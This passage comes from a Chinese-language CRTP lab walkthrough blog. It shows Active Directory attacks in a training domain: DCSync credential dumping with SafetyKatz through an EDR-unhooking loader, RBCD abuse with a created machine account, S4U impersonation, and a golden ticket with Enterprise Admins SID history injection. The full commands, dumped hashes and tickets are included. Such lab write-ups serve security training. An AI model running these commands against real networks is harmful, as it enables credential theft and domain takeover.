s1Yp0C6pfzLM+ckFAZcpymsF74mQn6Pp1zV6eW8NBgLOqN7WUd/BxBL8Ecnyfb66m5U9KADWcBRQM/fq</span><br><span class="line">      /W26Bzwc/cHgzpMH+Oi1CDjmxoFtzYd7ICOYY110lBkvRhRTn4gs8oD7Mp8AWsmbXWj+sN1kORgiW7J7</span><br><span class="line">      esgI8Y3+xmAS6QIHgI9dx7wIdLpqV36gsdRLyUwIdoV+M9m1d3Kep483Td7AdC4mTsPF9ny/bWVxrVuj</span><br><span class="line">      L40vzxpdtbMWJYqtBZSCaS5WuhndmSqkw6MXDZ3PADH1DhPSfEUaMTAfXCqPPLpdYOFjMIe08Yga6/jT</span><br><span class="line">      VFpY1e7t9rD3/gq07DLfo4IBDjCCAQqgAwIBAKKCAQEEgf59gfswgfiggfUwgfIwge+gGzAZoAMCARGh</span><br><span class="line">      EgQQhZfYbRrsOlmDN8qYb10P+qEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqER</span><br><span class="line">      MA8bDWFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyNTA1MjcxMTI2NThaphEYDzIwMjUwNTI3MjEy</span><br><span class="line">      NjU3WqcRGA8yMDI1MDYwMzExMjY1N1qoHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypNjA0oAMC</span><br><span class="line">      AQKhLTArGwRsZGFwGyNkY29ycC1kYy5kb2xsYXJjb3JwLm1vbmV5Y29ycC5MT0NBTA==</span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>

<p>然后检查下票据，确认有了 <code>ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL</code> 的服务票了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PS C:\ad\tools&gt; .\Loader.exe -path .\Rubeus.exe -args klist</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : klist</span><br><span class="line"></span><br><span class="line">Action: List Kerberos Tickets (Current User)</span><br><span class="line"></span><br><span class="line">[*] Current LUID    : 0x2de521</span><br><span class="line"></span><br><span class="line">  UserName                 : student522</span><br><span class="line">  Domain                   : dcorp</span><br><span class="line">  LogonId                  : 0x2de521</span><br><span class="line">  UserSID                  : S-1-5-21-719815819-3726368948-3917688648-20682</span><br><span class="line">  AuthenticationPackage    : Kerberos</span><br><span class="line">  LogonType                : RemoteInteractive</span><br><span class="line">  LogonTime                : 5/25/2025 6:26:34 AM</span><br><span class="line">  LogonServer              : DCORP-DC</span><br><span class="line">  LogonServerDNSDomain     : DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">  UserPrincipalName        : student522@dollarcorp.moneycorp.local</span><br><span class="line"></span><br><span class="line">    [0] - 0x12 - aes256_cts_hmac_sha1</span><br><span class="line">      Start/End/MaxRenew: 5/27/2025 4:26:58 AM ; 5/27/2025 2:26:57 PM ; 6/3/2025 4:26:57 AM</span><br><span class="line">      Server Name       : ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">      Client Name       : administrator @ DOLLARCORP.MONEYCORP.LOCAL</span><br><span class="line">      Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</span><br></pre></td></tr></table></figure>

<p>因为dcsync需要ldap服务，所以就可以在域控上以<code>administrator</code> 权限做了 <code>dcsync</code> 了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe -path .\SafetyKatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>这里访问lab手册里其他服务指的是访问 <code>ldap</code> 服务，所以是flag 为 <code>ldap</code></p>
<hr>
<h2 id="Learning-Objective-17-1"><a href="#Learning-Objective-17-1" class="headerlink" title="Learning Objective - 17 - 1"></a>Learning Objective - 17 - 1</h2><blockquote>
<p>Computer account on which ciadmin can configure Resource-based Constrained Delegation</p>
</blockquote>
<blockquote>
<p>哪一个机器账户可以通过ciadmin账户来配置rbcd</p>
</blockquote>
<p>先枚举一下ciadmin对于域内所有对象的acl</p>
<p>拿一下账户的sid先</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\AD\Tools&gt; (get-domainobject -Identity ciadmin).objectsid</span><br><span class="line">S-1-5-21-719815819-3726368948-3917688648-1121</span><br></pre></td></tr></table></figure>

<p>然后筛选一下，只有一个 <code>DCORP-MGMT</code> 账户，ciadmin对他有 <code>genericwrite</code> 可以来修改属性达到rbcd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PS C:\AD\Tools&gt; get-domainobjectacl |?&#123;$_.SecurityIdentifier -eq &quot;S-1-5-21-719815819-3726368948-3917688648-1121&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ObjectDN              : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local</span><br><span class="line">ObjectSID             : S-1-5-21-719815819-3726368948-3917688648-1108</span><br><span class="line">ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite</span><br><span class="line">BinaryLength          : 36</span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">IsCallback            : False</span><br><span class="line">OpaqueLength          : 0</span><br><span class="line">AccessMask            : 131132</span><br><span class="line">SecurityIdentifier    : S-1-5-21-719815819-3726368948-3917688648-1121</span><br><span class="line">AceType               : AccessAllowed</span><br><span class="line">AceFlags              : None</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : None</span><br><span class="line">PropagationFlags      : None</span><br><span class="line">AuditFlags            : None</span><br></pre></td></tr></table></figure>

<p>所以flag 是 <code>dcorp-mgmt</code></p>
<p>来都来了，就坐下rbcd</p>
<p>先得弄个能控制的，机器账户或者是配置了spn的账户来做第一跳。</p>
<p>还是用student账户创建个机器账户算了。</p>
<p>(New-MachineAccount是powermad.ps1里的)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount test522 -Password $(ConvertTo-SecureString &#x27;P4ssword123!&#x27; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-60.png" alt="alt text"></p>
<p>然后确认下成了</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-61.png" alt="alt text"></p>
<p>用刚才约束委派弄得ldap去dcsync下ciadmin的key，然后下发一张TGT，<strong>或者直接去dcorp-ci上用jenkins的弹回来的那个ciadmin的shell做</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools&gt;.\Loader.exe <span class="literal">-path</span> .\SafetyKatz.exe <span class="literal">-args</span> <span class="string">&quot;lsadump::evasive-dcsync /user:dcorp\ciadmin&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\SafetyKatz.exe Arguments : lsadump::evasive<span class="literal">-dcsync</span> /user:dcorp\ciadmin <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::evasive-dcsync /user:dcorp\ciadmin</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dollarcorp.moneycorp.local&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dcorp\ciadmin&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : ci admin</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : ciadmin</span><br><span class="line">User Principal Name  : ciadmin</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">11</span>/<span class="number">14</span>/<span class="number">2022</span> <span class="number">10</span>:<span class="number">07</span>:<span class="number">20</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-1121</span></span><br><span class="line">Object Relative ID   : <span class="number">1121</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: e08253add90dccf1a208523d02998c3d</span><br><span class="line">    ntlm- <span class="number">0</span>: e08253add90dccf1a208523d02998c3d</span><br><span class="line">    lm  - <span class="number">0</span>: <span class="number">0</span>b9e30209dad2b9a1c5fc2e31b189687</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">0</span>eb1cb3fd9c1de8595b0339c7ac99152</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALciadmin</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">1</span>bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">47</span>c59924be154de7483b2efb597d43ae</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8</span>f9df2c4e5b52601</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>请求一下ciadmin票子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe -path .\Rubeus.exe -args asktgt  /user:ciadmin /aes256:1bbe86f1b5285109dd1450b55ed8851c220b81cc187f9af64e4048ed25083879 /ptt</span><br></pre></td></tr></table></figure>

<p>然后用powerview的 <code>Set-domainRBCD</code> 修改 <code>DCORP-MGMT</code> 机器的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 字段指向刚才新创建的机器 <code>test522</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-domainRBCD -Identity DCORP-MGMT -DelegateFrom &#x27;test522&#x27; -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-62.png" alt="alt text"></p>
<p>然后再确认下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="variable">$rawBytes</span> =(<span class="built_in">Get-DomainObject</span> <span class="literal">-Identity</span> <span class="string">&quot;dcorp-mgmt&quot;</span>).<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span></span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; (<span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="variable">$RawBytes</span>, <span class="number">0</span>).DiscretionaryAcl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BinaryLength       : <span class="number">36</span></span><br><span class="line">AceQualifier       : AccessAllowed</span><br><span class="line">IsCallback         : False</span><br><span class="line">OpaqueLength       : <span class="number">0</span></span><br><span class="line">AccessMask         : <span class="number">983551</span></span><br><span class="line">SecurityIdentifier : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-24101</span></span><br><span class="line">AceType            : AccessAllowed</span><br><span class="line">AceFlags           : None</span><br><span class="line">IsInherited        : False</span><br><span class="line">InheritanceFlags   : None</span><br><span class="line">PropagationFlags   : None</span><br><span class="line">AuditFlags         : None</span><br></pre></td></tr></table></figure>

<p>然后做rbcd</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe <span class="literal">-path</span>  .\Rubeus.exe <span class="literal">-args</span> s4u /user:test522 /password:<span class="string">&#x27;P4ssword123!&#x27;</span> /msdsspn:WSMAN/dcorp<span class="literal">-mgmt</span>.dollarcorp.moneycorp.local /impersonateuser:administrator</span><br></pre></td></tr></table></figure>

<p>这个阿三魔改的rubeus还不准用明文密码我擦</p>
<p>（这图密码错了咦嘻嘻）<br><img src="/wpimages/2025/crtp-lab-note/image-63.png" alt="alt text"></p>
<p>又去gen了个nthash <code>A9A70FD4DF48FBFAB37E257CFA953312</code></p>
<p><img src="/wpimages/2025/crtp-lab-note/image-64.png" alt="alt text"></p>
<p>然后做rbcd</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe <span class="literal">-path</span>  .\Rubeus.exe <span class="literal">-args</span> s4u /user:test522<span class="variable">$</span> /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /msdsspn:WSMAN/dcorp<span class="literal">-mgmt</span>.dollarcorp.moneycorp.local /impersonateuser:administrator /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-65.png" alt="alt text"></p>
<p>检查票据</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-66.png" alt="alt text"></p>
<p>ok了，不过这wsman得配合http一起才能远程特么</p>
<p>所以我干脆弄了张http的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe -path  .\Rubeus.exe -args s4u /user:test522$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /msdsspn:HTTP/dcorp-mgmt.dollarcorp.moneycorp.local /impersonateuser:administrator /ptt</span><br></pre></td></tr></table></figure>

<p>就可以远程了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:dcorp-mgmt.dollarcorp.moneycorp.local cmd</span><br></pre></td></tr></table></figure>


<p><img src="/wpimages/2025/crtp-lab-note/image-71.png" alt="alt text"></p>
<h2 id="Learning-Objective-18-1"><a href="#Learning-Objective-18-1" class="headerlink" title="Learning Objective - 18 - 1"></a>Learning Objective - 18 - 1</h2><blockquote>
<p>SID history injected to escalate to Enterprise Admins</p>
</blockquote>
<blockquote>
<p>通过sid history属性注入提权至企业管理员</p>
</blockquote>
<p>这里有俩种方式</p>
<p>分别是</p>
<ul>
<li>用krbtgt的key在as-rep的（伪造）TGT之中注入 <code>sids</code></li>
<li>用跨域密钥，伪造跨域（referral）tgt里面注入</li>
</ul>
<p>两种方法我都会用一下</p>
<p>但都需要先拿一下企业管理员的sid</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-Domainobject</span> <span class="literal">-Domain</span> moneycorp.local <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> |<span class="built_in">select</span> objectsid</span><br><span class="line"></span><br><span class="line">objectsid</span><br><span class="line"><span class="literal">---------</span></span><br><span class="line">S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span></span><br></pre></td></tr></table></figure>

<p>然后通过金票伪造，在TGT内注入企业管理员组的sid history</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> evasive<span class="literal">-golden</span> /user:student522 /aes256:<span class="number">154</span>cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /printcmd /ldap /nowrap  /ptt /sids:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : evasive<span class="literal">-golden</span> /user:student522 /aes256:<span class="number">154</span>cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /printcmd /ldap /nowrap /ptt /sids:S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line">[*] Action: Build TGT</span><br><span class="line"></span><br><span class="line">[*] Trying to query LDAP <span class="keyword">using</span> LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(samaccountname=student522)&#x27;</span></span><br><span class="line">[*] Retrieving <span class="built_in">group</span> and domain policy information over LDAP from domain controller dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(|(distinguishedname=CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;))&#x27;</span></span><br><span class="line">[*] Attempting to <span class="built_in">mount</span>: \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[*] \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local\SYSVOL successfully mounted</span><br><span class="line">[*] Attempting to unmount: \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[*] \\dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local\SYSVOL successfully unmounted</span><br><span class="line">[*] Attempting to <span class="built_in">mount</span>: \\us.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully mounted</span><br><span class="line">[*] Attempting to unmount: \\us.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully unmounted</span><br><span class="line">[*] Retrieving netbios name information over LDAP from domain controller dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path <span class="string">&#x27;CN=Configuration,DC=moneycorp,DC=local&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))&#x27;</span></span><br><span class="line">[*] Building PAC</span><br><span class="line"></span><br><span class="line">[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)</span><br><span class="line">[*] SID            : S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span></span><br><span class="line">[*] UserId         : <span class="number">20682</span></span><br><span class="line">[*] Groups         : <span class="number">1123</span>,<span class="number">513</span></span><br><span class="line">[*] ExtraSIDs      : S<span class="literal">-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line">[*] ServiceKey     : <span class="number">154</span>CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256</span><br><span class="line">[*] KDCKey         : <span class="number">154</span>CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848</span><br><span class="line">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256</span><br><span class="line">[*] Service        : krbtgt</span><br><span class="line">[*] Target         : dollarcorp.moneycorp.local</span><br><span class="line"></span><br><span class="line">[*] Generating EncTicketPart</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting EncTicketPart</span><br><span class="line">[*] Generating Ticket</span><br><span class="line">[*] Generated KERB<span class="literal">-CRED</span></span><br><span class="line">[*] Forged a TGT <span class="keyword">for</span> <span class="string">&#x27;student522@dollarcorp.moneycorp.local&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] AuthTime       : <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">33</span>:<span class="number">17</span> AM</span><br><span class="line">[*] StartTime      : <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">33</span>:<span class="number">17</span> AM</span><br><span class="line">[*] EndTime        : <span class="number">5</span>/<span class="number">27</span>/<span class="number">2025</span> <span class="number">6</span>:<span class="number">33</span>:<span class="number">17</span> PM</span><br><span class="line">[*] RenewTill      : <span class="number">6</span>/<span class="number">3</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">33</span>:<span class="number">17</span> AM</span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGNjCCBjKgAwIBBaEDAgEWooIE8zCCBO9hggTrMIIE56ADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOCBI8wggSLoAMCARKhAwIBA6KCBH0EggR5aAB+qN2UvEoWGBvrlEvlGxwe+TMyT9gFTwitdk80nZGCDQJ+CxjOkjijwc+aVTBN3CXAIRdO6iTkGGnCcOtdBjH/nf88qF2aL2NF5vEPdO6YiaECQUbXP0etc/cI/W1uB4YaaLDqCho2KMyYm8/<span class="number">9</span>d+XzTpeJ2KK2VE/<span class="number">198</span>RymCk46eEswrzAu2eC4+kqOGSOdT5T7DzZGskvJsyCp2TM7EBviTMBw+emSC6FK4JH5Vz/TVoY/qXxFOBOPW7rPWEFwi3qCgauACbrcqEmMNg9RktaCppQ3u8seGPFE+<span class="number">7</span>BKCd7Q1QOyHm44QPW4GRDP8xjErhYeN8LWuFM9gCi6V5fm3rUbltsOGfARI2XthzxmNRUI6THvykIiYr5l66k7eVWiHaTUoWmtl+Tub4InJyXLA+<span class="number">7</span>APCj1t04HpljRzPPn02fvj0x3XP+to4F4E86yzLQt2cL2vpmm3zV51<span class="built_in">Ps</span>/EOBaYXaUyquewUKCyqI+i0AU2H4yLnagvszzLg0blnnGy0I6EY26GNa4WADQQF6QzIsAtuIwNfBZwWIdo91y8xFdEANoVPhxD4kG8eO/LomJ6C5WTgvltgGi24N3liK/<span class="number">5</span>UAyAWLCmQRZ3RdrBmnO4/tYkxUob6XZZlRIqVuiVy6bAAVw89Q3a/nwrfjVPTrYP/uAjQnKdkMLBh61ezueBGUsH1usAlCItXFTDD9d4k8G+ZQYeqpy8pxQBTzFuRpk9qGDNT7EN+yi1MsBQ7sDM0uTsdM54XFlRM+iahsx/<span class="number">9</span>u44d61C3V+i13D8w2UyT51wKkFZ4Sw14fucgRYYcRV1LsiBhz2+sAUnwK8lBH6SIJ5d+pNSF0qn3nM11K6nhs2AxLnk8KAqgQuDbYL63M/cL1pLiwu4cLGh4BMce7X9NN/egyz9s6lI3yGfL6nmXJyKAumGKAN41TnUXwXCm6V+tyCDEor4Qs3sgiuDhDggyKyfws2QEul/fklG3NEDtdCz9el5bf8Mpy/<span 